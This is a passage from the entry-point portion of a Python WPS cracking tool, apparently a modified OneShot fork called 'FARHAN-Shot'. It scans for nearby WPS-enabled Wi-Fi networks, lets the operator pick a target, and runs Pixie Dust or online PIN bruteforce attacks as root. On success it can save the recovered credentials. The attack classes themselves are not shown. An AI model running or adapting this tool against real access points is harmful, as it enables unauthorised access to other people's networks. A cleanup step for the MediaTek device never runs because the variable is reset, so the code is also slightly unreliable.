
        return network_list

    def prompt_network(self):
        """Prompt user to select network"""
        os.system('clear')
        banner = f"""
{light_gray}    ════════════════════════════════════════════════════════{reset}
{white}    ▶{reset} {white}Version:{reset} {green}2.0.3 Enhanced Edition{reset}
{white}    ▶{reset} {white}Core Engine:{reset} {cyan}OneShot + Enhanced Algorithms{reset}
{white}    ▶{reset} {white}Modified By:{reset} {light_cyan}FARHAN{reset}
{white}    ▶{reset} {white}Repository:{reset} {light_blue}github.com/Gtajisan{reset}
{light_gray}    ════════════════════════════════════════════════════════{reset}
{red}    [{white}!{red}]{reset} {yellow}WiFi Security Assessment Tool - Use Ethically & Legally{reset}
{light_gray}    ════════════════════════════════════════════════════════{reset}
"""
        print(banner)

        networks = self.iw_scanner()
        if not networks:
            print(f'{err} No WPS networks found.')
            return None, None
        
        while True:
            try:
                networkNo = input(f'{ask} Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]['BSSID'], networks[int(networkNo)].get('Level')
                else:
                    raise IndexError
            except Exception:
                print(f'{err} Invalid number')


def ifaceUp(iface, down=False):
    """Bring interface up or down"""
    action = 'down' if down else 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    return res.returncode == 0


def die(msg):
    """Exit with error message"""
    sys.stderr.write(msg + '\n')
    sys.exit(1)


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='FARHAN-Shot v2.0.3 Enhanced - Advanced WPS Security Testing',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
    )

    parser.add_argument('-i', '--interface', type=str, required=True,
                       help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', type=str,
                       help='BSSID of the target AP')
    parser.add_argument('-p', '--pin', type=str,
                       help='Use the specified pin (arbitrary string or 4/8 digit pin)')
    parser.add_argument('-K', '--pixie-dust', action='store_true',
                       help='Run enhanced Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true',
                       help='Run Pixiewps with --force option (bruteforce full range)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
                       help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true',
                       help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
                       help='Run WPS push button connection')
    parser.add_argument('-d', '--delay', type=float,
                       help='Set the delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true',
                       help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true',
                       help='Down network interface when the work is finished')
    parser.add_argument('--vuln-list', type=str,
                       default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
                       help='Use custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true',
                       help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true',
                       help='Reverse order of networks in the list of networks')
    parser.add_argument('--mtk-wifi', action='store_true',
                       help='Activate MediaTek Wi-Fi interface driver on startup')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    android_network = AndroidNetwork()
    wmtWifi_device = None
    
    while True:
        try:
            if isAndroid():
                android_network.storeAlwaysScanState()
                android_network.disableWifi()

            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            
            if args.pbc:
                companion.single_connection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print(f'{info} BSSID not specified (--bssid) — scanning for available networks')
                    rssi = -50
                    args.bssid, rssi = scanner.prompt_network()

                if args.bssid:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    rssi_value = rssi if rssi else -50
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                   args.show_pixie_cmd, args.pixie_force, rssi=rssi_value)
            
            if not args.loop:
                break
            else:
                args.bssid = None
        
        except KeyboardInterrupt:
            if args.loop:
                if input(f"\n{ask} Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print(f"{info} Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print(f"\n{info} Aborting…")
                break
        finally:
            if isAndroid():
                android_network.enableWifi()
    
    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi and wmtWifi_device:
        wmtWifi_device.write_text("0")
